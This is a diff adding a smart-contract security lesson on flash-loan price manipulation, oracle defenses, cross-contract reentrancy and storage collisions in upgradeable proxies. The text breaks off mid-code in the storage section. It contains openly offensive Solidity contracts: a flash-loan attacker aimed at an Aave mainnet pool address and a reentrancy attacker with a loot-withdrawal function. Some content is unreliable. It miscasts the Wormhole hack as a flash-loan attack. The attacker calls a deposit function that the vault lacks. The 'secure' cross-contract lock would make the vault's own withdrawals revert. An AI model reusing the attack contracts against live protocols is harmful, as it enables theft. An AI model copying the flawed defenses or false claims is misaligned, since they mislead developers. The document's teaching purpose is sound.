@@ -1,0 +1,1830 @@
+---
+id: "dapp-security-lesson-6"
+slug: "advanced-attack-vectors"
+module: "advanced-security"
+number: "5.17"
+title: "Advanced Attack Vectors & Defense in Depth"
+objective: "Master sophisticated attack patterns including flash loans, oracle manipulation, cross-contract reentrancy, and frontrunning, with defense-in-depth strategies."
+practicalTakeaway: "Build protocols that resist advanced exploits used in $1B+ of DeFi hacks through layered security controls and economic attack modeling."
+---
+
+# Advanced Attack Vectors & Defense in Depth
+
+## Why this matters now
+
+You've mastered basic vulnerabilities (common-vulnerability-patterns), role-based access control (role-based-access-control), comprehensive testing (security-testing-audit-preparation), and emergency response (emergency-response-circuit-breakers), but the most devastating DeFi hacks use sophisticated attack vectors that simple patterns don't catch. Flash loan attacks drained $320M from Wormhole, oracle manipulation cost Mango Markets $110M, and cross-contract reentrancy exploited Curve for $62M.
+
+These attacks combine multiple techniques: flash loans for instant capital, oracle manipulation for price control, cross-contract interactions for state confusion, and frontrunning for MEV extraction. Traditional audits often miss them because they require specific market conditions or multi-step setups.
+
+**Connection to previous lessons**: You've learned basic vulnerabilities (common-vulnerability-patterns), role-based access control for pausers and administrators (role-based-access-control), comprehensive testing including fuzz testing (security-testing-audit-preparation), and emergency response mechanisms (emergency-response-circuit-breakers). This lesson combines all those foundations with sophisticated attack patterns that bypass simple defenses—you'll need proper access control, thorough testing, and emergency circuits to defend against these advanced vectors.
+
+This lesson teaches you to think like an advanced attacker: how flash loans provide risk-free capital for exploits, how to manipulate price oracles (and defend with TWAP + sanity checks), how cross-contract reentrancy bypasses simple guards, how storage collisions brick upgradeable contracts, how signature replay drains accounts, and how frontrunning extracts value. You'll learn defense in depth—layering controls so no single failure compromises security.
+
+## Conceptual foundations for advanced attacks
+
+**Definition — Flash loan attack**: Exploit using borrowed capital that's repaid in same transaction. **Why it's powerful**: Attacker needs zero capital, can borrow millions, exploit price/state assumptions that rely on capital constraints, repay instantly. If exploit fails, transaction reverts with no loss.
+
+**Definition — Oracle manipulation**: Exploiting price feed vulnerabilities to borrow under-collateralized, liquidate unfairly, or drain liquidity pools. **Attack surfaces**: Low-liquidity AMM pools (manipulate via large swaps), stale oracle data (use outdated prices), centralized oracles (compromise data source), oracle front-running (exploit price lag).
+
+**Definition — Cross-contract reentrancy**: Reentrancy via shared state across contracts. **Why guards fail**: Contract A has ReentrancyGuard, but attacker re-enters Contract B which shares state with A. Standard guard only checks single contract's lock.
+
+<ReentrancyAttackVisualizer />
+
+**Definition — Storage collision**: In upgradeable proxies, new implementation's storage layout conflicts with old, corrupting state. **Why it's critical**: Can brick contracts permanently, steal funds by reinterpreting storage slots, or grant attacker admin rights by overwriting access control slots.
+
+**Definition — Signature replay attack**: Reusing valid signature on different contract/chain. **Attack vectors**: Signature lacks chainId (replay on forks), lacks contract address (replay on similar contracts), lacks nonce (replay multiple times), or lacks expiry (replay years later).
+
+**Mental model — Economic attack modeling**: Instead of finding code bugs, model economic incentives. Ask: "Can attacker profit by exploiting this, even if code is 'correct'?" Flash loans, MEV, and oracle manipulation are economic attacks, not code bugs.
+
+**Anti-pattern — "Our oracle is Chainlink, so we're safe"**: Assuming external dependency means security. **Why it fails**: Chainlink feeds can have stale data, low update frequency, or be de-listed. Must add circuit breakers, sanity checks, and fallback oracles.
+
+## Guided code walk-throughs
+
+### 1) Flash loan attack defense
+
+Flash loans let attackers borrow millions with zero capital, enabling exploits that would otherwise require whale-level funds.
+
+#### Vulnerable lending pool
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+/**
+ * @title VulnerableLending
+ * @notice Lending pool vulnerable to flash loan price manipulation
+ * @dev Uses spot price from AMM—can be manipulated in single transaction
+ */
+contract VulnerableLending {
+    IERC20 public collateralToken;
+    IERC20 public borrowToken;
+    IUniswapV2Pair public priceOracle;  // ⚠️ Spot price = manipulable
+    
+    mapping(address => uint256) public collateralDeposits;
+    mapping(address => uint256) public borrowed;
+    
+    uint256 public constant COLLATERAL_RATIO = 150;  // 150% collateralization
+    
+    constructor(address _collateral, address _borrow, address _oracle) {
+        collateralToken = IERC20(_collateral);
+        borrowToken = IERC20(_borrow);
+        priceOracle = IUniswapV2Pair(_oracle);
+    }
+    
+    /**
+     * @notice Deposit collateral
+     */
+    function depositCollateral(uint256 amount) external {
+        collateralToken.transferFrom(msg.sender, address(this), amount);
+        collateralDeposits[msg.sender] += amount;
+    }
+    
+    /**
+     * @notice Borrow against collateral
+     * @dev 🚨 VULNERABLE: Uses spot price which can be manipulated via flash loan
+     */
+    function borrow(uint256 amount) external {
+        // Get current price from AMM spot price
+        uint256 collateralPrice = getSpotPrice();
+        
+        // Calculate max borrow based on collateral value
+        uint256 collateralValue = collateralDeposits[msg.sender] * collateralPrice;
+        uint256 maxBorrow = (collateralValue * 100) / COLLATERAL_RATIO;
+        
+        require(borrowed[msg.sender] + amount <= maxBorrow, "Under-collateralized");
+        
+        borrowed[msg.sender] += amount;
+        borrowToken.transfer(msg.sender, amount);
+    }
+    
+    /**
+     * @notice Get spot price from AMM
+     * @dev ⚠️ VULNERABILITY: Spot price can be manipulated in same transaction
+     */
+    function getSpotPrice() public view returns (uint256) {
+        (uint112 reserve0, uint112 reserve1, ) = priceOracle.getReserves();
+        // Simplified: collateralToken/borrowToken price
+        return (uint256(reserve1) * 1e18) / uint256(reserve0);
+    }
+}
+
+interface IUniswapV2Pair {
+    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+}
+
+interface IAavePoolV3 {
+    function flashLoan(
+        address receiverAddress,
+        address[] calldata assets,
+        uint256[] calldata amounts,
+        uint256[] calldata interestRateModes,
+        address onBehalfOf,
+        bytes calldata params,
+        uint16 referralCode
+    ) external;
+}
+```
+
+**Flash loan attack scenario:**
+
+```solidity
+/**
+ * @title FlashLoanAttacker
+ * @notice Exploits VulnerableLending using Aave flash loan
+ */
+contract FlashLoanAttacker {
+    VulnerableLending public lending;
+    IUniswapV2Pair public amm;
+    IERC20 public collateralToken;
+    IERC20 public borrowToken;
+    
+    // Aave Pool V3 address (Ethereum mainnet example)
+    address constant AAVE_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
+    
+    constructor(address _lending, address _amm) {
+        lending = VulnerableLending(_lending);
+        amm = IUniswapV2Pair(_amm);
+        collateralToken = lending.collateralToken();
+        borrowToken = lending.borrowToken();
+    }
+    
+    /**
+     * @notice Execute flash loan attack
+     * @dev Steps:
+     *   1. Flash loan 1M collateral tokens
+     *   2. Swap collateral → borrow tokens in AMM (manipulate price UP)
+     *   3. Deposit small collateral to lending protocol
+     *   4. Borrow max at inflated price (get way more than should)
+     *   5. Swap back to restore AMM price
+     *   6. Repay flash loan
+     *   7. Profit = over-borrowed amount
+     */
+    function attack() external {
+        // 1. Flash loan 1M collateral tokens from Aave V3
+        uint256 flashAmount = 1_000_000e18;
+        
+        // Aave V3 flash loan parameters:
+        // - receiverAddress: address(this)
+        // - assets: address[] (array of token addresses)
+        // - amounts: uint256[] (array of amounts)
+        // - interestRateModes: uint256[] (0 for no debt)
+        // - onBehalfOf: address(this)
+        // - params: bytes (custom data)
+        // - referralCode: uint16 (use 0)
+        
+        address[] memory assets = new address[](1);
+        assets[0] = address(collateralToken);
+        
+        uint256[] memory amounts = new uint256[](1);
+        amounts[0] = flashAmount;
+        
+        uint256[] memory interestRateModes = new uint256[](1);
+        interestRateModes[0] = 0; // No debt mode (repay in same tx)
+        
+        IAavePoolV3(AAVE_POOL).flashLoan(
+            address(this),         // receiverAddress
+            assets,                // assets array
+            amounts,               // amounts array
+            interestRateModes,     // modes array
+            address(this),         // onBehalfOf
+            abi.encode("attack"),  // params
+            0                      // referralCode
+        );
+    }
+    
+    /**
+     * @notice Aave flash loan callback
+     */
+    function executeOperation(
+        address[] calldata assets,
+        uint256[] calldata amounts,
+        uint256[] calldata premiums,
+        address initiator,
+        bytes calldata params
+    ) external returns (bool) {
+        // 2. Swap 900K collateral → borrow tokens (manipulate price UP)
+        collateralToken.approve(address(amm), 900_000e18);
+        // Simplified swap (actual would use router)
+        // This drastically reduces collateral reserves, inflating collateral price
+        
+        // 3. Deposit 10K collateral to lending (small deposit)
+        collateralToken.approve(address(lending), 10_000e18);
+        lending.depositCollateral(10_000e18);
+        
+        // 4. Borrow at manipulated price
+        // Price now shows collateral is 10x more valuable than reality
+        // Can borrow 10x more borrow tokens than should be allowed
+        lending.borrow(1_000_000e18);  // Should only get ~6,666 but get 1M
+        
+        // 5. Swap borrow tokens back to collateral (restore price)
+        // This undoes the manipulation
+        
+        // 6. Repay flash loan
+        uint256 repayAmount = amounts[0] + premiums[0];
+        collateralToken.approve(AAVE_POOL, repayAmount);
+        
+        // 7. Profit = over-borrowed tokens still in our balance
+        // Attack complete in single transaction (risk-free)
+        
+        return true;
+    }
+}
+```
+
+**Attack profit calculation:**
+- Flash loan: 1M collateral (repay 1.0009M equals 900 fee)
+- Manipulated borrow: 1M borrow tokens (should only get 6.6K)
+- Real value gained: ~993K borrow tokens
+- Profit: $993K if borrow token equals $1
+
+#### Secure implementation with TWAP
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";
+
+/**
+ * @title SecureLending
+ * @notice Lending pool resistant to flash loan attacks
+ * @dev Uses Chainlink oracle + TWAP + sanity checks
+ */
+contract SecureLending {
+    IERC20 public collateralToken;
+    IERC20 public borrowToken;
+    AggregatorV3Interface public chainlinkOracle;
+    IUniswapV2Pair public ammOracle;  // Backup TWAP oracle
+    
+    mapping(address => uint256) public collateralDeposits;
+    mapping(address => uint256) public borrowed;
+    
+    uint256 public constant COLLATERAL_RATIO = 150;
+    uint256 public constant MAX_PRICE_DEVIATION = 10;  // 10% max deviation
+    uint256 public constant PRICE_STALENESS_THRESHOLD = 1 hours;
+    
+    constructor(
+        address _collateral,
+        address _borrow,
+        address _chainlinkOracle,
+        address _ammOracle
+    ) {
+        collateralToken = IERC20(_collateral);
+        borrowToken = IERC20(_borrow);
+        chainlinkOracle = AggregatorV3Interface(_chainlinkOracle);
+        ammOracle = IUniswapV2Pair(_ammOracle);
+    }
+    
+    /**
+     * @notice Borrow against collateral
+     * @dev ✅ SECURE: Uses Chainlink + sanity checks + TWAP fallback
+     */
+    function borrow(uint256 amount) external {
+        // Get price with defense-in-depth
+        uint256 collateralPrice = getSecurePrice();
+        
+        uint256 collateralValue = collateralDeposits[msg.sender] * collateralPrice;
+        uint256 maxBorrow = (collateralValue * 100) / COLLATERAL_RATIO;
+        
+        require(borrowed[msg.sender] + amount <= maxBorrow, "Under-collateralized");
+        
+        borrowed[msg.sender] += amount;
+        borrowToken.transfer(msg.sender, amount);
+    }
+    
+    /**
+     * @notice Get secure price with multiple defenses
+     * @dev Defense layers:
+     *   1. Primary: Chainlink oracle (manipulation-resistant)
+     *   2. Validation: Check freshness (detect oracle downtime)
+     *   3. Sanity check: Compare to TWAP (detect manipulation)
+     *   4. Circuit breaker: Pause if deviation too large
+     */
+    function getSecurePrice() public view returns (uint256) {
+        // Layer 1: Get Chainlink price
+        (
+            uint80 roundId,
+            int256 chainlinkPrice,
+            ,
+            uint256 updatedAt,
+            uint80 answeredInRound
+        ) = chainlinkOracle.latestRoundData();
+        
+        require(chainlinkPrice > 0, "Invalid Chainlink price");
+        require(answeredInRound >= roundId, "Stale Chainlink data");
+        
+        // Layer 2: Check freshness
+        require(
+            block.timestamp - updatedAt < PRICE_STALENESS_THRESHOLD,
+            "Chainlink price too stale"
+        );
+        
+        // Layer 3: Get TWAP for comparison
+        uint256 twapPrice = getTWAP();
+        
+        // Layer 4: Sanity check (Chainlink vs TWAP deviation)
+        uint256 priceUint = uint256(chainlinkPrice);
+        uint256 deviation = priceUint > twapPrice
+            ? ((priceUint - twapPrice) * 100) / twapPrice
+            : ((twapPrice - priceUint) * 100) / priceUint;
+        
+        require(
+            deviation <= MAX_PRICE_DEVIATION,
+            "Price deviation too large - possible manipulation"
+        );
+        
+        // Return Chainlink price (most reliable)
+        return priceUint;
+    }
+    
+    // Storage for TWAP calculation
+    uint256 public price0CumulativeLastStored;
+    uint256 public price1CumulativeLastStored;
+    uint32 public blockTimestampLastStored;
+    uint256 public constant TWAP_PERIOD = 10 minutes;
+    
+    /**
+     * @notice Update stored cumulative prices (call periodically, e.g., every hour)
+     * @dev Stores historical price data needed for TWAP calculation
+     * @dev Should be called by keeper/bot or in critical user functions
+     */
+    function updatePriceObservation() external {
+        uint256 price0Cumulative = IUniswapV2Pair(ammOracle).price0CumulativeLast();
+        uint256 price1Cumulative = IUniswapV2Pair(ammOracle).price1CumulativeLast();
+        (,, uint32 blockTimestamp) = IUniswapV2Pair(ammOracle).getReserves();
+        
+        price0CumulativeLastStored = price0Cumulative;
+        price1CumulativeLastStored = price1Cumulative;
+        blockTimestampLastStored = blockTimestamp;
+    }
+    
+    /**
+     * @notice Calculate time-weighted average price (TWAP)
+     * @dev Uses Uniswap V2 cumulative prices over TWAP_PERIOD
+     * @dev TWAP cannot be manipulated in single transaction (requires sustained manipulation)
+     * @return twapPrice Time-weighted average price in collateralToken per borrowToken
+     */
+    function getTWAP() public view returns (uint256 twapPrice) {
+        // Get current cumulative prices
+        uint256 price0CumulativeCurrent = IUniswapV2Pair(ammOracle).price0CumulativeLast();
+        (,, uint32 blockTimestampCurrent) = IUniswapV2Pair(ammOracle).getReserves();
+        
+        // Calculate time elapsed since last observation
+        uint32 timeElapsed = blockTimestampCurrent - blockTimestampLastStored;
+        require(timeElapsed >= TWAP_PERIOD, "TWAP window too short");
+        
+        // Calculate average price over period
+        // price0Cumulative is stored as UQ112x112 (112-bit fixed point)
+        // Formula: (price0CumulativeCurrent - price0CumulativeLastStored) / timeElapsed
+        // Result is still in UQ112x112 format, needs conversion to standard uint256
+        uint256 priceAverage = (price0CumulativeCurrent - price0CumulativeLastStored) / timeElapsed;
+        
+        // Convert from UQ112x112 to standard format
+        // UQ112x112 means: actual_price = stored_value / 2^112
+        // To get standard 18-decimal format, multiply by 1e18 then divide by 2^112
+        twapPrice = (priceAverage * 1e18) >> 112; // Equivalent to: (priceAverage * 1e18) / (2^112)
+        
+        return twapPrice;
+    }
+}
+
+interface IUniswapV2Pair {
+    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+    function price0CumulativeLast() external view returns (uint256);
+    function price1CumulativeLast() external view returns (uint256);
+}
+```
+
+**Defense layers explained:**
+
+**Layer 1: Chainlink oracle** → Prevents spot price manipulation
+- Chainlink aggregates multiple sources, making manipulation difficult
+
+**Layer 2: Freshness check** → Prevents stale data exploitation
+- Rejects price data older than 1 hour
+
+**Layer 3: TWAP comparison** → Detects sudden price changes
+- TWAP cannot be manipulated in a single transaction
+
+**Layer 4: Circuit breaker** → Halts operations during anomalies
+- Auto-pauses if deviation exceeds 10%, requires investigation
+
+### When to use each defense layer
+
+**Decision matrix for oracle protection:**
+
+**Under $100K TVL (Low Risk)**
+- Primary Oracle: Chainlink
+- Backup Oracle: Optional
+- Sanity Checks: ±20%
+- Circuit Breaker: Manual pause
+- TWAP Required? ❌ No
+
+**$100K-$1M TVL (Medium Risk)**
+- Primary Oracle: Chainlink
+- Backup Oracle: TWAP fallback
+- Sanity Checks: ±10%
+- Circuit Breaker: Manual pause
+- TWAP Required? ✅ Yes
+
+**$1M-$10M TVL (High Risk)**
+- Primary Oracle: Chainlink
+- Backup Oracle: TWAP + Tellor
+- Sanity Checks: ±5%
+- Circuit Breaker: Auto-pause above 10%
+- TWAP Required? ✅ Yes
+
+**Over $10M TVL (Critical Risk)**
+- Primary Oracle: Multiple oracles
+- Backup Oracle: TWAP + 2 backups
+- Sanity Checks: ±3%
+- Circuit Breaker: Auto-pause above 5%
+- TWAP Required? ✅ Yes + formal verification
+
+**Key principle**: As TVL increases, attack profitability increases, requiring stronger defenses. A $1M flash loan attack isn't worth the effort on a $50K protocol, but becomes highly profitable on a $10M+ protocol.
+
+### 2) Oracle manipulation defenses
+
+Comprehensive oracle security beyond basic Chainlink usage.
+
+#### Multi-oracle aggregation
+
+```solidity
+/**
+ * @title MultiOracleAggregator
+ * @notice Aggregates multiple price sources for manipulation resistance
+ * @dev If oracles disagree significantly, contract pauses
+ */
+contract MultiOracleAggregator {
+    AggregatorV3Interface public chainlinkOracle;
+    IUniswapV2Pair public uniswapOracle;
+    address public tellorOracle;
+    
+    uint256 public constant MAX_ORACLE_DEVIATION = 5;  // 5% max difference
+    uint256 public constant MIN_ORACLES_REQUIRED = 2;
+    
+    bool public paused;
+    
+    /**
+     * @notice Get median price from multiple oracles
+     * @dev Uses median (not average) to resist outlier manipulation
+     */
+    function getPrice() external view returns (uint256) {
+        require(!paused, "Oracles paused due to inconsistency");
+        
+        uint256[] memory prices = new uint256[](3);
+        uint256 validCount = 0;
+        
+        // Collect prices from all oracles
+        try this.getChainlinkPrice() returns (uint256 price) {
+            prices[validCount++] = price;
+        } catch {}
+        
+        try this.getUniswapTWAP() returns (uint256 price) {
+            prices[validCount++] = price;
+        } catch {}
+        
+        try this.getTellorPrice() returns (uint256 price) {
+            prices[validCount++] = price;
+        } catch {}
+        
+        require(validCount >= MIN_ORACLES_REQUIRED, "Insufficient valid oracles");
+        
+        // Sort prices to find median
+        for (uint256 i = 0; i < validCount - 1; i++) {
+            for (uint256 j = 0; j < validCount - i - 1; j++) {
+                if (prices[j] > prices[j + 1]) {
+                    (prices[j], prices[j + 1]) = (prices[j + 1], prices[j]);
+                }
+            }
+        }
+        
+        // Return median
+        uint256 medianPrice = validCount % 2 == 0
+            ? (prices[validCount / 2 - 1] + prices[validCount / 2]) / 2
+            : prices[validCount / 2];
+        
+        // Verify deviation is acceptable
+        uint256 maxDeviation = getMaxDeviation(prices, validCount);
+        require(maxDeviation <= MAX_ORACLE_DEVIATION, "Oracle deviation too high");
+        
+        return medianPrice;
+    }
+    
+    /**
+     * @notice Calculate max deviation among oracle prices
+     */
+    function getMaxDeviation(uint256[] memory prices, uint256 count) 
+        internal 
+        pure 
+        returns (uint256) 
+    {
+        if (count < 2) return 0;
+        
+        uint256 minPrice = prices[0];
+        uint256 maxPrice = prices[count - 1];  // Already sorted
+        
+        return ((maxPrice - minPrice) * 100) / minPrice;
+    }
+    
+    function getChainlinkPrice() external view returns (uint256) {
+        (, int256 price, , uint256 updatedAt, ) = chainlinkOracle.latestRoundData();
+        require(block.timestamp - updatedAt < 1 hours, "Stale");
+        require(price > 0, "Invalid");
+        return uint256(price);
+    }
+    
+    function getUniswapTWAP() external view returns (uint256) {
+        // Implement TWAP calculation
+        return 0;  // Simplified
+    }
+    
+    function getTellorPrice() external view returns (uint256) {
+        // Implement Tellor oracle query
+        return 0;  // Simplified
+    }
+}
+```
+
+### 3) Cross-contract reentrancy
+
+Standard ReentrancyGuard only protects single contract. Shared state across contracts needs cross-contract protection.
+
+#### Vulnerable multi-contract system
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+
+/**
+ * @title TokenVault (Contract A)
+ * @notice Holds user token deposits
+ * @dev Has ReentrancyGuard but still vulnerable to cross-contract reentrancy
+ */
+contract TokenVault is ReentrancyGuard {
+    mapping(address => uint256) public balances;
+    RewardDistributor public rewardContract;
+    
+    constructor(address _rewardContract) {
+        rewardContract = RewardDistributor(_rewardContract);
+    }
+    
+    /**
+     * @notice Withdraw tokens
+     * @dev ✅ Protected by ReentrancyGuard
+     * @dev 🚨 BUT vulnerable to cross-contract reentrancy via rewardContract
+     */
+    function withdraw(uint256 amount) external nonReentrant {
+        require(balances[msg.sender] >= amount, "Insufficient balance");
+        
+        // Update state before external call (CEI pattern)
+        balances[msg.sender] -= amount;
+        
+        // External call to reward contract
+        // ⚠️ This can re-enter via RewardDistributor.claimRewards()
+        rewardContract.updateRewards(msg.sender);
+        
+        // Transfer tokens
+        (bool success, ) = msg.sender.call{value: amount}("");
+        require(success, "Transfer failed");
+    }
+}
+
+/**
+ * @title RewardDistributor (Contract B)
+ * @notice Distributes rewards based on vault balances
+ * @dev Shares state with TokenVault via balance queries
+ */
+contract RewardDistributor is ReentrancyGuard {
+    TokenVault public vault;
+    mapping(address => uint256) public rewards;
+    
+    constructor(address _vault) {
+        vault = TokenVault(_vault);
+    }
+    
+    /**
+     * @notice Update user rewards based on vault balance
+     * @dev 🚨 VULNERABILITY: Reads vault.balances which may be inconsistent
+     */
+    function updateRewards(address user) external nonReentrant {
+        // Read balance from vault
+        // ⚠️ If called during vault.withdraw(), balance already decreased
+        // but transfer hasn't happened yet
+        uint256 userBalance = vault.balances(user);
+        
+        // Calculate rewards based on balance
+        rewards[user] += userBalance / 100;  // 1% reward
+    }
+    
+    /**
+     * @notice Claim accumulated rewards
+     * @dev Has ReentrancyGuard but doesn't help cross-contract
+     */
+    function claimRewards() external nonReentrant {
+        uint256 reward = rewards[msg.sender];
+        require(reward > 0, "No rewards");
+        
+        rewards[msg.sender] = 0;
+        
+        // This can be called during vault.withdraw() via attacker's receive()
+        (bool success, ) = msg.sender.call{value: reward}("");
+        require(success, "Transfer failed");
+    }
+}
+```
+
+**Cross-contract reentrancy attack:**
+
+```solidity
+/**
+ * @title CrossContractReentrancyAttacker
+ * @notice Exploits shared state between TokenVault and RewardDistributor
+ */
+contract CrossContractReentrancyAttacker {
+    TokenVault public vault;
+    RewardDistributor public rewards;
+    bool public attacking;
+    uint256 public attackCount;
+    
+    constructor(address _vault, address _rewards) {
+        vault = TokenVault(payable(_vault));
+        rewards = RewardDistributor(payable(_rewards));
+    }
+    
+    function attack() external payable {
+        require(msg.value >= 10 ether, "Need at least 10 ETH to attack");
+        
+        // Deposit ETH to vault
+        vault.deposit{value: 10 ether}();
+        
+        // Trigger withdraw (will call our receive())
+        attacking = true;
+        attackCount = 0;
+        vault.withdraw(10 ether);
+    }
+    
+    /**
+     * @notice Receive callback triggered during vault.withdraw()
+     * @dev Called AFTER vault decreases balance but BEFORE transfer completes
+     */
+    receive() external payable {
+        if (attacking && attackCount < 3) { // Limit reentrancy attempts
+            attacking = false; // Prevent infinite loop
+            attackCount++;
+            
+            // Re-enter via RewardDistributor while vault.withdraw() is still executing
+            // At this point:
+            // - vault.balances[this] already decreased to 0
+            // - But we haven't actually received funds yet (tx still executing)
+            // - rewards.updateRewards() will read decreased balance
+            // - Can claim rewards based on decreased balance multiple times
+            
+            try rewards.claimRewards() {
+                // Successfully claimed rewards during vulnerable window
+            } catch {
+                // Rewards exhausted or claim failed
+            }
+            
+            attacking = true; // Re-enable for next callback (if any)
+        }
+    }
+    
+    // Withdraw stolen funds
+    function withdrawLoot() external {
+        payable(msg.sender).transfer(address(this).balance);
+    }
+    
+    // Check attack success
+    function checkBalance() external view returns (uint256) {
+        return address(this).balance;
+    }
+}
+```
+
+#### Secure cross-contract pattern
+
+```solidity
+/**
+ * @title SecureVault
+ * @notice Cross-contract reentrancy protection using shared lock
+ */
+contract SecureVault {
+    mapping(address => uint256) public balances;
+    RewardDistributor public rewardContract;
+    
+    // Shared reentrancy lock (used by both contracts)
+    uint256 private constant _NOT_ENTERED = 1;
+    uint256 private constant _ENTERED = 2;
+    uint256 public reentrancyLock = _NOT_ENTERED;
+    
+    modifier crossContractNonReentrant() {
+        require(reentrancyLock != _ENTERED, "Cross-contract reentrancy");
+        reentrancyLock = _ENTERED;
+        _;
+        reentrancyLock = _NOT_ENTERED;
+    }
+    
+    function withdraw(uint256 amount) external crossContractNonReentrant {
+        require(balances[msg.sender] >= amount, "Insufficient balance");
+        balances[msg.sender] -= amount;
+        
+        // ✅ Safe: rewardContract checks our reentrancyLock before executing
+        rewardContract.updateRewards(msg.sender);
+        
+        (bool success, ) = msg.sender.call{value: amount}("");
+        require(success, "Transfer failed");
+    }
+}
+
+contract RewardDistributor {
+    SecureVault public vault;
+    mapping(address => uint256) public rewards;
+    
+    /**
+     * @notice Update rewards with cross-contract reentrancy protection
+     * @dev Checks vault's reentrancy lock before proceeding
+     */
+    function updateRewards(address user) external {
+        // ✅ Check if vault is currently executing (reentrancy detection)
+        require(vault.reentrancyLock() == 1, "Vault locked - reentrancy attempt");
+        
+        uint256 userBalance = vault.balances(user);
+        rewards[user] += userBalance / 100;
+    }
+}
+```
+
+### When cross-contract reentrancy protection is needed
+
+**Use shared locks when:**
+- ✅ Multiple contracts share state (balances, rewards, deposits)
+- ✅ Contract A calls Contract B which reads Contract A's state
+- ✅ External calls happen during state transitions
+- ✅ Protocol has over $100K TVL (economic incentive to exploit)
+
+**Standard ReentrancyGuard is sufficient when:**
+- ✅ Single contract, no external contract dependencies
+- ✅ External calls only to trusted contracts (e.g., ERC20 transfers)
+- ✅ All state updates complete before external calls (CEI pattern followed)
+
+**Example decision:**
+- **Staking contract + Reward distributor: NEED shared lock** (cross-contract interaction)
+- **Simple ERC20 token: DON'T NEED shared lock** (no cross-contract dependencies)
+- **Lending protocol + Oracle contract: NEED validation** (reads during critical operations)
+- **Simple vault with no dependencies: Standard guard sufficient** (isolated contract)
+
+### 4) Storage collision prevention
+
+Upgradeable proxies must maintain consistent storage layouts across versions.
+
+#### Vulnerable upgrade (storage collision)
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+/**
+ * @title VaultV1 (Original implementation)
+ */
+contract VaultV1 {
+    // Storage slot 0
+    address public owner;
+    
+    // Storage slot 1
+    uint256 public totalDeposits;
+    
+    // Storage slot 2
+    mapping(address => uint256) public balances;
+    
+    function deposit() external payable {
+        balances[msg.sender] += msg.value;
+        totalDeposits += msg.value;
+    }
+}
+
+/**
+ * @title VaultV2 (Vulnerable upgrade)
+ * @dev 🚨 VULNERABILITY: Added variable BEFORE existing ones
+ */
+contract VaultV2 {
+    // Storage slot 0 (NEW - causes collision!)
+    bool public paused;
+    
+    // Storage slot 1 (was slot 0 in V1 - now corrupted!)
+    address public owner;
+    
+    // Storage slot 2 (was slot 1 in V1 - now corrupted!)
+    uint256 public totalDeposits;
+    
+    // Storage slot 3 (was slot 2 in V1 - now at wrong slot!)
+    mapping(address => uint256) public balances;
+    
+    // After upgrade:
+    // - paused reads owner's address as bool
+    // - owner reads totalDeposits as address
+    // - totalDeposits reads balances mapping slot
+    // - All user balances lost (reading from wrong slot)
+}
+```
+
+**Attack scenario:**
+1. Contract deployed as VaultV1 with $1M user deposits
+2. Upgrade to VaultV2 (new storage layout)
+3. `owner` now points to `totalDeposits` value
+4. Attacker calls `transferOwnership(attacker)` (if function exists)
+5. Since `owner` reads from wrong slot, check passes with manipulated value
+6. Attacker becomes owner, drains $1M
+
+**Understanding storage slots:**
+
+Solidity stores state variables in 256-bit storage slots sequentially:
+
+```solidity
+// VaultV1 storage layout:
+// Slot 0: address owner (20 bytes, but uses full 32-byte slot)
+// Slot 1: uint256 totalDeposits (32 bytes)
+// Slot 2: mapping(address => uint256) balances (mapping doesn't use a single slot, 
+//         but slot 2 is the "base" for computing storage locations)
+
+// VaultV2 BROKEN storage layout (NEVER DO THIS):
+// Slot 0: bool paused (1 byte, but uses full 32-byte slot) ⚠️ COLLISION!
+// Slot 1: address owner (now at wrong slot!) ⚠️ COLLISION!
+// Slot 2: uint256 totalDeposits (now at wrong slot!) ⚠️ COLLISION!
+// Slot 3: mapping(address => uint256) balances (now at wrong slot!) ⚠️ COLLISION!
+```
+
+**What happens after upgrade:**
+1. Proxy still has data in slots 0, 1, 2 from V1
+2. V2 code interprets slot 0 as `bool paused` instead of `address owner`
+3. Reads owner address `0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb8` as boolean
+4. Interprets first byte (0x74 equals 116 in decimal) as `true` (paused is true)
+5. All functions using `paused` now behave incorrectly
+6. Worse: Writing to `paused` overwrites `owner` address data
+7. Result: Contract bricked, $1M in user funds inaccessible
+
+#### Secure upgrade pattern
+
+**Why storage gaps fix this:**
+
+```solidity
+/**
+ * @title SecureVaultV1
+ * @dev Uses OpenZeppelin storage gap pattern
+ */
+contract SecureVaultV1 {
+    address public owner;           // Slot 0
+    uint256 public totalDeposits;   // Slot 1
+    mapping(address => uint256) public balances; // Slot 2
+    
+    // Reserve 47 storage slots for future variables
+    // This lets us add variables without shifting existing ones
+    uint256[47] private __gap;      // Slots 3-49 RESERVED
+    // Total: 50 slots allocated
+}
+
+/**
+ * @title SecureVaultV2
+ * @dev ✅ SECURE: New variables added at END using gap slots
+ */
+contract SecureVaultV2 {
+    address public owner;           // Slot 0 (unchanged)
+    uint256 public totalDeposits;   // Slot 1 (unchanged)
+    mapping(address => uint256) public balances;  // Slot 2 (unchanged)
+    
+    // New variable uses first gap slot
+    bool public paused;  // Slot 3 (uses first __gap slot from V1)
+    
+    // Reduced gap (47 - 1 = 46 slots remaining)
+    uint256[46] private __gap;      // Slots 4-49 (reduced by 1)
+    // Total: still 50 slots
+}
+```
+
+New variable uses gap slots instead of shifting existing variables.
+
+**Best practices:**
+- Always add `uint256[50] private __gap;` to base contracts
+- When adding variables in upgrades, reduce gap size accordingly
+- Use OpenZeppelin's `@openzeppelin/hardhat-upgrades` plugin to validate storage layouts
+- Never remove or reorder existing variables
+- Never change variable types (even if same size)
+- Test upgrades on forked mainnet before deploying to production
+
+```solidity
+
+/**
+ * @title DetectStorageCollisions
+ * @dev Use OpenZeppelin upgrade plugin to detect collisions automatically
+ */
+// In hardhat.config.js:
+// import '@openzeppelin/hardhat-upgrades';
+//
+// const { upgrades } = require("hardhat");
+// await upgrades.upgradeProxy(proxyAddress, SecureVaultV2);
